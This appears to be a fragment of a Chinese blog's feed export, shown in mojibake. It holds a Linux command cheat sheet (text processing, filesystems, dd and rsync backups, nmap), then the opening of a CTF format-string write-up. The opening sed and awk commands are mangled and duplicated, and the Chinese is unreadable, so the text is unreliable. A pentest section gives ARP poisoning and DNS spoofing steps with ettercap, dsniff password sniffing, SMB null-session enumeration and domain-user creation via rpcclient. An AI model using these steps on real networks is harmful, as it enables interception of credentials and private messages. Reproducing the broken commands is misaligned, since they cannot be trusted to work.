*//‚Ä≤example.txtÂà†Èô§ÊØè‰∏ÄË°åÊúÄÂêéÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶sed‚àíe‚Ä≤s/stringa1//g‚Ä≤example.txt‰ªéÊñáÊ°£‰∏≠Âè™Âà†Èô§ËØçÊ±á"string1"Âπ∂‰øùÁïôÂâ©‰ΩôÂÖ®ÈÉ®sed‚àín‚Ä≤1,5p;5q‚Ä≤example.txtÊü•Áúã‰ªéÁ¨¨‰∏ÄË°åÂà∞Á¨¨5Ë°åÂÜÖÂÆπsed‚àín‚Ä≤5p;5q‚Ä≤example.txtÊü•ÁúãÁ¨¨5Ë°åsed‚àíe‚Ä≤s/00‚àó/0/g‚Ä≤example.txtÁî®Âçï‰∏™Èõ∂ÊõøÊç¢Â§ö‰∏™Èõ∂cat‚àínfile1Ê†áÁ§∫Êñá‰ª∂ÁöÑË°åÊï∞catexample.txt|awk‚Ä≤NR//‚Ä≤example.txtÂà†Èô§ÊØè‰∏ÄË°åÊúÄÂêéÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶sed‚àíe‚Ä≤s/stringa1//g‚Ä≤example.txt‰ªéÊñáÊ°£‰∏≠Âè™Âà†Èô§ËØçÊ±á"string1"Âπ∂‰øùÁïôÂâ©‰ΩôÂÖ®ÈÉ®sed‚àín‚Ä≤1,5p;5q‚Ä≤example.txtÊü•Áúã‰ªéÁ¨¨‰∏ÄË°åÂà∞Á¨¨5Ë°åÂÜÖÂÆπsed‚àín‚Ä≤5p;5q‚Ä≤example.txtÊü•ÁúãÁ¨¨5Ë°åsed‚àíe‚Ä≤s/00‚àó/0/g‚Ä≤example.txtÁî®Âçï‰∏™Èõ∂ÊõøÊç¢Â§ö‰∏™Èõ∂cat‚àínfile1Ê†áÁ§∫Êñá‰ª∂ÁöÑË°åÊï∞catexample.txt|awk‚Ä≤NR1}'</span> Êü•Áúã‰∏ÄË°åÁ¨¨‰∏ÄÊ†è <span class="token keyword">echo</span> a b c <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print 1,1,3}'</span> Êü•Áúã‰∏ÄË°åÁöÑÁ¨¨‰∏ÄÂíåÁ¨¨‰∏âÊ†è <span class="token function">paste</span> file1 file2 ÂêàÂπ∂‰∏§‰∏™Êñá‰ª∂Êàñ‰∏§Ê†èÁöÑÂÜÖÂÆπ <span class="token function">paste</span> -d <span class="token string">'+'</span> file1 file2 ÂêàÂπ∂‰∏§‰∏™Êñá‰ª∂Êàñ‰∏§Ê†èÁöÑÂÜÖÂÆπÔºå‰∏≠Èó¥Áî®<span class="token string">"+"</span>Âå∫ÂàÜ <span class="token function">sort</span> file1 file2 ÊéíÂ∫è‰∏§‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> ÂèñÂá∫‰∏§‰∏™Êñá‰ª∂ÁöÑÂπ∂ÈõÜ<span class="token punctuation">(</span>ÈáçÂ§çÁöÑË°åÂè™‰øùÁïô‰∏Ä‰ªΩ<span class="token punctuation">)</span> <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -u Âà†Èô§‰∫§ÈõÜÔºåÁïô‰∏ãÂÖ∂‰ªñÁöÑË°å <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -d ÂèñÂá∫‰∏§‰∏™Êñá‰ª∂ÁöÑ‰∫§ÈõÜ<span class="token punctuation">(</span>Âè™Áïô‰∏ãÂêåÊó∂Â≠òÂú®‰∫é‰∏§‰∏™Êñá‰ª∂‰∏≠ÁöÑÊñá‰ª∂<span class="token punctuation">)</span> <span class="token function">comm</span> -1 file1 file2 ÊØîËæÉ‰∏§‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπÂè™Âà†Èô§ <span class="token string">'file1'</span> ÊâÄÂåÖÂê´ÁöÑÂÜÖÂÆπ <span class="token function">comm</span> -2 file1 file2 ÊØîËæÉ‰∏§‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπÂè™Âà†Èô§ <span class="token string">'file2'</span> ÊâÄÂåÖÂê´ÁöÑÂÜÖÂÆπ <span class="token function">comm</span> -3 file1 file2 ÊØîËæÉ‰∏§‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπÂè™Âà†Èô§‰∏§‰∏™Êñá‰ª∂ÂÖ±ÊúâÁöÑÈÉ®ÂàÜ</code></pre><h2 id="Â≠óÁ¨¶ËÆæÁΩÆÂíåÊñá‰ª∂Ê†ºÂºèËΩ¨Êç¢"><a href="#Â≠óÁ¨¶ËÆæÁΩÆÂíåÊñá‰ª∂Ê†ºÂºèËΩ¨Êç¢" class="headerlink" title="Â≠óÁ¨¶ËÆæÁΩÆÂíåÊñá‰ª∂Ê†ºÂºèËΩ¨Êç¢"></a>Â≠óÁ¨¶ËÆæÁΩÆÂíåÊñá‰ª∂Ê†ºÂºèËΩ¨Êç¢</h2><pre class=" language-bash"><code class="language-bash">dos2unix filedos.txt fileunix.txt Â∞Ü‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ÁöÑÊ†ºÂºè‰ªéMSDOSËΩ¨Êç¢ÊàêUNIX unix2dos fileunix.txt filedos.txt Â∞Ü‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ÁöÑÊ†ºÂºè‰ªéUNIXËΩ¨Êç¢ÊàêMSDOS recode <span class="token punctuation">..</span>HTML <span class="token operator">&lt;</span> page.txt <span class="token operator">></span> page.html Â∞Ü‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ËΩ¨Êç¢Êàêhtml recode -l <span class="token operator">|</span> <span class="token function">more</span> ÊòæÁ§∫ÊâÄÊúâÂÖÅËÆ∏ÁöÑËΩ¨Êç¢Ê†ºÂºè</code></pre><h2 id="Êñá‰ª∂Á≥ªÁªüÂàÜÊûê"><a href="#Êñá‰ª∂Á≥ªÁªüÂàÜÊûê" class="headerlink" title="Êñá‰ª∂Á≥ªÁªüÂàÜÊûê"></a>Êñá‰ª∂Á≥ªÁªüÂàÜÊûê</h2><pre class=" language-bash"><code class="language-bash">badblocks -v /dev/hda1 Ê£ÄÊü•Á£ÅÁõòhda1‰∏äÁöÑÂùèÁ£ÅÂùó <span class="token function">fsck</span> /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏älinuxÊñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß fsck.ext2 /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏äext2Êñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß e2fsck /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏äext2Êñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß e2fsck -j /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏äext3Êñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß fsck.ext3 /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏äext3Êñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß fsck.vfat /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏äfatÊñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß fsck.msdos /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏ädosÊñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß dosfsck /dev/hda1 ‰øÆÂ§ç/Ê£ÄÊü•hda1Á£ÅÁõò‰∏ädosÊñá‰ª∂Á≥ªÁªüÁöÑÂÆåÊï¥ÊÄß</code></pre><h2 id="ÂàùÂßãÂåñ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü"><a href="#ÂàùÂßãÂåñ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü" class="headerlink" title="ÂàùÂßãÂåñ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü"></a>ÂàùÂßãÂåñ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü</h2><pre class=" language-bash"><code class="language-bash"> mkfs /dev/hda1 Âú®hda1ÂàÜÂå∫ÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü mke2fs /dev/hda1 Âú®hda1ÂàÜÂå∫ÂàõÂª∫‰∏Ä‰∏™linux ext2ÁöÑÊñá‰ª∂Á≥ªÁªü mke2fs -j /dev/hda1 Âú®hda1ÂàÜÂå∫ÂàõÂª∫‰∏Ä‰∏™linux ext3<span class="token punctuation">(</span>Êó•ÂøóÂûã<span class="token punctuation">)</span>ÁöÑÊñá‰ª∂Á≥ªÁªü mkfs -t vfat 32 -F /dev/hda1 ÂàõÂª∫‰∏Ä‰∏™ FAT32 Êñá‰ª∂Á≥ªÁªü <span class="token function">fdformat</span> -n /dev/fd0 Ê†ºÂºèÂåñ‰∏Ä‰∏™ËΩØÁõò mkswap /dev/hda3 ÂàõÂª∫‰∏Ä‰∏™swapÊñá‰ª∂Á≥ªÁªüSWAPÊñá‰ª∂Á≥ªÁªü mkswap /dev/hda3 ÂàõÂª∫‰∏Ä‰∏™swapÊñá‰ª∂Á≥ªÁªü swapon /dev/hda3 ÂêØÁî®‰∏Ä‰∏™Êñ∞ÁöÑswapÊñá‰ª∂Á≥ªÁªü swapon /dev/hda2 /dev/hdb3 ÂêØÁî®‰∏§‰∏™swapÂàÜÂå∫</code></pre><h2 id="Â§á‰ªΩ"><a href="#Â§á‰ªΩ" class="headerlink" title="Â§á‰ªΩ"></a>Â§á‰ªΩ</h2><pre class=" language-bash"><code class="language-bash">dump -0aj -f /tmp/home0.bak /home Âà∂‰Ωú‰∏Ä‰∏™ <span class="token string">'/home'</span> ÁõÆÂΩïÁöÑÂÆåÊï¥Â§á‰ªΩ dump -1aj -f /tmp/home0.bak /home Âà∂‰Ωú‰∏Ä‰∏™ <span class="token string">'/home'</span> ÁõÆÂΩïÁöÑ‰∫§‰∫íÂºèÂ§á‰ªΩ restore -if /tmp/home0.bak ËøòÂéü‰∏Ä‰∏™‰∫§‰∫íÂºèÂ§á‰ªΩ <span class="token function">rsync</span> -rogpav --delete /home /tmp ÂêåÊ≠•‰∏§ËæπÁöÑÁõÆÂΩï <span class="token function">rsync</span> -rogpav -e <span class="token function">ssh</span> --delete /home ip_address:/tmp ÈÄöËøáSSHÈÄöÈÅìrsync <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete ip_addr:/home/public /home/local ÈÄöËøásshÂíåÂéãÁº©Â∞Ü‰∏Ä‰∏™ËøúÁ®ãÁõÆÂΩïÂêåÊ≠•Âà∞Êú¨Âú∞ÁõÆÂΩï <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete /home/local ip_addr:/home/public ÈÄöËøásshÂíåÂéãÁº©Â∞ÜÊú¨Âú∞ÁõÆÂΩïÂêåÊ≠•Âà∞ËøúÁ®ãÁõÆÂΩï <span class="token function">dd</span> bs<span class="token operator">=</span>1M if<span class="token operator">=</span>/dev/hda <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">|</span> <span class="token function">ssh</span> user@ip_addr <span class="token string">'dd of=hda.gz'</span> ÈÄöËøásshÂú®ËøúÁ®ã‰∏ªÊú∫‰∏äÊâßË°å‰∏ÄÊ¨°Â§á‰ªΩÊú¨Âú∞Á£ÅÁõòÁöÑÊìç‰Ωú <span class="token function">dd</span> if<span class="token operator">=</span>/dev/sda of<span class="token operator">=</span>/tmp/file1 Â§á‰ªΩÁ£ÅÁõòÂÜÖÂÆπÂà∞‰∏Ä‰∏™Êñá‰ª∂ <span class="token function">tar</span> -Puf backup.tar /home/user ÊâßË°å‰∏ÄÊ¨°ÂØπ <span class="token string">'/home/user'</span> ÁõÆÂΩïÁöÑ‰∫§‰∫íÂºèÂ§á‰ªΩÊìç‰Ωú <span class="token punctuation">(</span> <span class="token function">cd</span> /tmp/local/ <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> c <span class="token keyword">.</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/share/ &amp;&amp; tar x -p'</span> ÈÄöËøásshÂú®ËøúÁ®ãÁõÆÂΩï‰∏≠Â§çÂà∂‰∏Ä‰∏™ÁõÆÂΩïÂÜÖÂÆπ <span class="token punctuation">(</span> <span class="token function">tar</span> c /home <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/backup-home &amp;&amp; tar x -p'</span> ÈÄöËøásshÂú®ËøúÁ®ãÁõÆÂΩï‰∏≠Â§çÂà∂‰∏Ä‰∏™Êú¨Âú∞ÁõÆÂΩï <span class="token function">tar</span> cf - <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token punctuation">(</span>cd /tmp/backup <span class="token punctuation">;</span> <span class="token function">tar</span> xf - <span class="token punctuation">)</span> Êú¨Âú∞Â∞Ü‰∏Ä‰∏™ÁõÆÂΩïÂ§çÂà∂Âà∞Âè¶‰∏Ä‰∏™Âú∞ÊñπÔºå‰øùÁïôÂéüÊúâÊùÉÈôêÂèäÈìæÊé• <span class="token function">find</span> /home/user1 -name <span class="token string">'*.txt'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">cp</span> -av --target-directory<span class="token operator">=</span>/home/backup/ --parents ‰ªé‰∏Ä‰∏™ÁõÆÂΩïÊü•ÊâæÂπ∂Â§çÂà∂ÊâÄÊúâ‰ª• <span class="token string">'.txt'</span> ÁªìÂ∞æÁöÑÊñá‰ª∂Âà∞Âè¶‰∏Ä‰∏™ÁõÆÂΩï <span class="token function">find</span> /var/log -name <span class="token string">'*.log'</span> <span class="token operator">|</span> <span class="token function">tar</span> cv --files-from<span class="token operator">=</span>- <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token operator">></span> log.tar.bz2 Êü•ÊâæÊâÄÊúâ‰ª• <span class="token string">'.log'</span> ÁªìÂ∞æÁöÑÊñá‰ª∂Âπ∂ÂÅöÊàê‰∏Ä‰∏™bzipÂåÖ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hda of<span class="token operator">=</span>/dev/fd0 bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 ÂÅö‰∏Ä‰∏™Â∞Ü MBR <span class="token punctuation">(</span>Master Boot Record<span class="token punctuation">)</span>ÂÜÖÂÆπÂ§çÂà∂Âà∞ËΩØÁõòÁöÑÂä®‰Ωú <span class="token function">dd</span> if<span class="token operator">=</span>/dev/fd0 of<span class="token operator">=</span>/dev/hda bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 ‰ªéÂ∑≤Áªè‰øùÂ≠òÂà∞ËΩØÁõòÁöÑÂ§á‰ªΩ‰∏≠ÊÅ¢Â§çMBRÂÜÖÂÆπ</code></pre><h2 id="ÂÖâÁõò"><a href="#ÂÖâÁõò" class="headerlink" title="ÂÖâÁõò"></a>ÂÖâÁõò</h2><pre class=" language-bash"><code class="language-bash">cdrecord -v gracetime<span class="token operator">=</span>2 dev<span class="token operator">=</span>/dev/cdrom -eject blank<span class="token operator">=</span>fast -force Ê∏ÖÁ©∫‰∏Ä‰∏™ÂèØÂ§çÂÜôÁöÑÂÖâÁõòÂÜÖÂÆπ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">></span> cd.iso Âú®Á£ÅÁõò‰∏äÂàõÂª∫‰∏Ä‰∏™ÂÖâÁõòÁöÑisoÈïúÂÉèÊñá‰ª∂ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> cd_iso.gz Âú®Á£ÅÁõò‰∏äÂàõÂª∫‰∏Ä‰∏™ÂéãÁº©‰∫ÜÁöÑÂÖâÁõòisoÈïúÂÉèÊñá‰ª∂ <span class="token function">mkisofs</span> -J -allow-leading-dots -R -V <span class="token string">"Label CD"</span> -iso-level 4 -o ./cd.iso data_cd ÂàõÂª∫‰∏Ä‰∏™ÁõÆÂΩïÁöÑisoÈïúÂÉèÊñá‰ª∂ cdrecord -v dev<span class="token operator">=</span>/dev/cdrom cd.iso ÂàªÂΩï‰∏Ä‰∏™ISOÈïúÂÉèÊñá‰ª∂ <span class="token function">gzip</span> -dc cd_iso.gz <span class="token operator">|</span> cdrecord dev<span class="token operator">=</span>/dev/cdrom - ÂàªÂΩï‰∏Ä‰∏™ÂéãÁº©‰∫ÜÁöÑISOÈïúÂÉèÊñá‰ª∂ <span class="token function">mount</span> -o loop cd.iso /mnt/iso ÊåÇËΩΩ‰∏Ä‰∏™ISOÈïúÂÉèÊñá‰ª∂ cd-paranoia -B ‰ªé‰∏Ä‰∏™CDÂÖâÁõòËΩ¨ÂΩïÈü≥ËΩ®Âà∞ wav Êñá‰ª∂‰∏≠ cd-paranoia -- <span class="token string">"-3"</span> ‰ªé‰∏Ä‰∏™CDÂÖâÁõòËΩ¨ÂΩïÈü≥ËΩ®Âà∞ wav Êñá‰ª∂‰∏≠ÔºàÂèÇÊï∞-3Ôºâ cdrecord --scanbus Êâ´ÊèèÊÄªÁ∫ø‰ª•ËØÜÂà´scsiÈÄöÈÅì <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hdc <span class="token operator">|</span> md5sum Ê†°È™å‰∏Ä‰∏™ËÆæÂ§áÁöÑmd5sumÁºñÁ†ÅÔºå‰æãÂ¶Ç‰∏ÄÂº† CD</code></pre><h2 id="Â∫îÁî®ÂëΩ‰ª§"><a href="#Â∫îÁî®ÂëΩ‰ª§" class="headerlink" title="Â∫îÁî®ÂëΩ‰ª§"></a>Â∫îÁî®ÂëΩ‰ª§</h2><pre class=" language-bash"><code class="language-bash">whois ÂüüÂêç/ip Êü•ÁúãÂüüÂêçÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ<span class="token function">ping</span> ÂüüÂêç/ip ÊµãËØïÊú¨Êú∫Âà∞ËøúÁ´Ø‰∏ªÊú∫ÊòØÂê¶ËÅîÈÄö„ÄÇ<span class="token function">dig</span> ÂüüÂêç/ip Êü•ÁúãÂüüÂêçËß£ÊûêÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇhost -l ÂüüÂêç dnsÊúçÂä°Âô® ‰º†Ëæìzone„ÄÇ</code></pre><h2 id="Êâ´Êèènmap"><a href="#Êâ´Êèènmap" class="headerlink" title="Êâ´Êèènmap"></a>Êâ´Êèènmap</h2><pre class=" language-bash"><code class="language-bash">-sS ÂçäÂºÄÊâ´ÊèèTCPÂíåSYNÊâ´Êèè„ÄÇ-sT ÂÆåÂÖ®TCPËøûÊé•Êâ´Êèè„ÄÇ-sU UDPÊâ´Êèè-PS synÂåÖÊé¢Êµã<span class="token punctuation">(</span>Èò≤ÁÅ´Â¢ôÊé¢Êµã<span class="token punctuation">)</span>-PA ackÂåÖÊé¢Êµã<span class="token punctuation">(</span>Èò≤ÁÅ´Â¢ôÊé¢Êµã<span class="token punctuation">)</span>-PN ‰∏çping„ÄÇ-n ‰∏çdnsËß£Êûê„ÄÇ-A -OÂíå-sV„ÄÇ-O Êìç‰ΩúÁ≥ªÁªüËØÜÂà´„ÄÇ-sV ÊúçÂä°ÁâàÊú¨‰ø°ÊÅØ<span class="token punctuation">(</span>banner<span class="token punctuation">)</span>-p Á´ØÂè£Êâ´Êèè„ÄÇ-T ËÆæÁΩÆÊó∂Èó¥Á∫ßÂà´<span class="token punctuation">(</span>0-5<span class="token punctuation">)</span>-iL ÂØºÂÖ•Êâ´ÊèèÁªìÊûú„ÄÇ-oG ËæìÂá∫Êâ´ÊèèÁªìÊûú„ÄÇÊìç‰ΩúÁ≥ªÁªüËØÜÂà´:p0f -i eth0 -U -p ÂºÄÂêØÊ∑∑ÊùÇÊ®°Âºè„ÄÇxprobe2 ip<span class="token operator">|</span>ÂüüÂêç Ê£ÄÊµãos„ÄÇbannerËé∑Âèñ:nc ip port Ê£ÄÊµãÁ´ØÂè£ÊòØÂê¶ÊâìÂºÄ„ÄÇtelnet ip port Ê£ÄÊµãÁ´ØÂè£ÊòØÂê¶ÊâìÂºÄ„ÄÇ<span class="token function">wget</span> ip ‰∏ãËΩΩ‰∏ªÈ°µ„ÄÇ<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">more</span> ÊòæÁ§∫‰∏ªÈ°µ‰ª£Á†Å„ÄÇq ÈÄÄÂá∫„ÄÇwindowsÊûö‰∏ænmap -sS -p 139,445 ip Êâ´Êèèwindows„ÄÇ<span class="token function">cd</span> /pentest/enumeration/smb-enumnbtscan -f targetIP Ê£ÄÊµãnetbios„ÄÇsmbgetserverinfo -i targetIP Êâ´Êèèname,os,ÁªÑ„ÄÇsmbdumpusers -i targetIP ÂàóÂá∫Áî®Êà∑„ÄÇsmbclient -L //targetIP ÂàóÂá∫ÂÖ±‰∫´„ÄÇ‰ΩøÁî®windows:net use \\ipipc$ <span class="token string">""</span> /u:<span class="token string">""</span> ÂºÄÂêØÁ©∫‰ºöËØù„ÄÇnet view \\ip ÊòæÁ§∫ÂÖ±‰∫´‰ø°ÊÅØ„ÄÇsmbclient:smbclient -L hostName -I targetIP Êûö‰∏æÂÖ±‰∫´„ÄÇsmbclient -L hostName/share -U <span class="token string">""</span> Áî®Á©∫Áî®Êà∑ËøûÊé•„ÄÇsmbclient -L hostName -I targetIP -U adminÊôÆÈÄöÁî®Êà∑ËøûÊé•„ÄÇrpcclient:rpcclient targetIP -U ‚Äú‚ÄùÊâìÂºÄ‰∏Ä‰∏™Á©∫‰ºöËØù„ÄÇnetshareenum Êûö‰∏æÂÖ±‰∫´„ÄÇenumdomusers Êûö‰∏æÁî®Êà∑„ÄÇlsaenumsid Êûö‰∏æÂüüSID„ÄÇqueryuser RID Êü•ËØ¢Áî®Êà∑‰ø°ÊÅØ„ÄÇcreatedomuser ÂàõÂª∫Áî®Êà∑ËÆøÈóÆ„ÄÇ</code></pre><h2 id="ARPÊ¨∫È™ó"><a href="#ARPÊ¨∫È™ó" class="headerlink" title="ARPÊ¨∫È™ó"></a>ARPÊ¨∫È™ó</h2><pre class=" language-bash"><code class="language-bash">ettercap:<span class="token function">nano</span> /usr/local/etc/etter.confÈÖçÁΩÆÊñá‰ª∂Sniff <span class="token operator">></span> Unified sniffing <span class="token operator">></span> Network interface: eth0 <span class="token operator">></span> OK ËÆæÁΩÆÊäìÂåÖÁöÑÁΩëÂç°Hosts <span class="token operator">></span> Scan <span class="token keyword">for</span> hosts <span class="token punctuation">(</span>do this two times<span class="token punctuation">)</span>Êâ´ÊèèÁΩëÊÆµÁöÑ‰∏ªÊú∫Hosts <span class="token operator">></span> Hosts list ÊòæÁ§∫‰∏ªÊú∫ÂàóË°®Select the default gateway <span class="token operator">></span> Add to Target 1 Ê∑ªÂä†‰∏ªÊú∫Select the target <span class="token operator">></span> Add to Target 2 Ê∑ªÂä†‰∏ªÊú∫Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK ËÆæÁΩÆARPÊîªÂáªStart <span class="token operator">></span> Start sniffing ÂºÄÂßãÊîªÂáªdsniff -i eth0 ÁõëÂê¨ÁΩëÂç°Á™ÉÂê¨ÁôªÂΩïÁî®Êà∑ÂØÜÁ†Åurlsnarf -i eth0 ÂóÖÊé¢httpËØ∑Ê±Çmsgsnarf -i eth0 ÂóÖÊé¢ËÅäÂ§©ËΩØ‰ª∂ÁöÑËÅäÂ§©ÂÜÖÂÆπdriftnet -i eth0 ÁΩëÁªúÁÆ°ÁêÜÂóÖÊé¢ÂõæÁâáÔºåÈü≥È¢ë„ÄÇdnsÊ¨∫È™ó:<span class="token function">nano</span> /usr/local/share/ettercap/etter.dnsÁºñËæëÈÖçÁΩÆÊñá‰ª∂Plugins <span class="token operator">></span> Manage the plugins <span class="token operator">></span> dns_spoof ËÆæÁΩÆdnsÊ¨∫È™óMitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK ËÆæÁΩÆARPStart <span class="token operator">></span> Start sniffing ÂºÄÂßãÊîªÂáª</code></pre><h2 id="ExploitsÊºèÊ¥ûÂà©Áî®"><a href="#ExploitsÊºèÊ¥ûÂà©Áî®" class="headerlink" title="ExploitsÊºèÊ¥ûÂà©Áî®"></a>ExploitsÊºèÊ¥ûÂà©Áî®</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /pentest/exploits/exploit-db ËøõÂÖ•ÁõÆÂΩï<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i <span class="token punctuation">[</span>exploit<span class="token punctuation">]</span> Êü•ËØ¢ÈúÄË¶ÅÁöÑÊºèÊ¥û<span class="token function">cat</span> exploit <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"#include"</span>Ê£ÄÊü•ËøêË°åÁéØÂ¢É<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i exploit <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1 <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> sys <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">":"</span> -f1 <span class="token operator">|</span> <span class="token function">sort</span> -uÂè™‰øùÁïôÂèØ‰ª•Âú®linux‰∏ãËøêË°åÁöÑ‰ª£Á†ÅMetasploit:svn update ÂçáÁ∫ß./msfweb WebÊé•Âè£127.0.0.1:55555„ÄÇ../msfconsole Â≠óÁ¨¶‰∏ãÁöÑConsole„ÄÇ<span class="token function">help</span> Â∏ÆÂä©show ÊòæÁ§∫ÈÄâÈ°π searc</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinuxÈáçÂÆöÂêë </tag>
            
            <tag> Â∏∏Áî®ÂëΩ‰ª§ÈõÜ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà31-Hitcon-‰∫î</title>
      <link href="/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/"/>
      <url>/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-ÂçÅÊúà31-Hitcon-‰∫î"><a href="#Pwn-ÂçÅÊúà31-Hitcon-‰∫î" class="headerlink" title="Pwn-ÂçÅÊúà31-Hitcon-‰∫î"></a>Pwn-ÂçÅÊúà31-Hitcon-‰∫î</h1><blockquote><p>È∏Ω‰∫ÜÂá†Â§©‰πãÂêéÔºåÁªßÁª≠ÁªÉ‰π†Hitconüò≠üÜí„ÄÇ</p></blockquote><h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂêåÊ†∑ÔºåËøô‰∏ÄÈ¢ò‰πüÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºå‰ΩÜÊòØËøôÈ¢òÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰∏çÂú®Ê†à‰∏äÔºåËÄåÊòØÂú®ÂÖ®Â±ÄÂèòÈáèÔºà.bss)ÊÆµÔºüÔºüÔºü‰ªÄ‰πàÊÉÖÂÜµüôÉ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÊâÄ‰ª•ËøôÈ¢òÊàë‰ª¨‰∏çËÉΩÁõ¥Êé•ÈÄöËøáÊéßÂà∂Ê†à‰∏äÂèòÈáèÊù•‰øÆÊîπGotË°®ÔºåÈÇ£ÊÑèÊÄùÊòØ‰ªÄ‰πàÂë¢ÔºüÂ∞±ÂèØ‰ª•ÈÄöËøáÈó¥Êé•ÁöÑÊñπÂºèÊù•‰øÆÊîπGotË°®ÂÜÖÂÆπÂíØ„ÄÇ</p></blockquote><h3 id="Êü•ÁúãÊñá‰ª∂‰ø°ÊÅØÂπ∂‰∏îÊ£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Êü•ÁúãÊñá‰ª∂‰ø°ÊÅØÂπ∂‰∏îÊ£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Êü•ÁúãÊñá‰ª∂‰ø°ÊÅØÂπ∂‰∏îÊ£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Êü•ÁúãÊñá‰ª∂‰ø°ÊÅØÂπ∂‰∏îÊ£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec playfmt</code>:</p><p><img src="https://i.loli.net/2018/10/31/5bd9a7693eb66.png" alt=""></p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê"><a href="#ÈÄªËæëÂàÜÊûê" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ÁÆÄÂçïËøêË°å‰∏Ä‰∏ãÁ®ãÂ∫èÂèØ‰ª•ÁúãÂà∞ÔºåËøôÊ¨°ÁöÑprintfÂáΩÊï∞buf‰∏çÂú®Ê†à‰∏äÔºåËÄåÊòØÂú®bssÊÆµ„ÄÇ</p></blockquote><p><img src="https://i.loli.net/2018/10/31/5bd9a9c834154.png" alt=""></p><p>IDAÁúã‰∏ÄÁúãÔºö</p><p><img 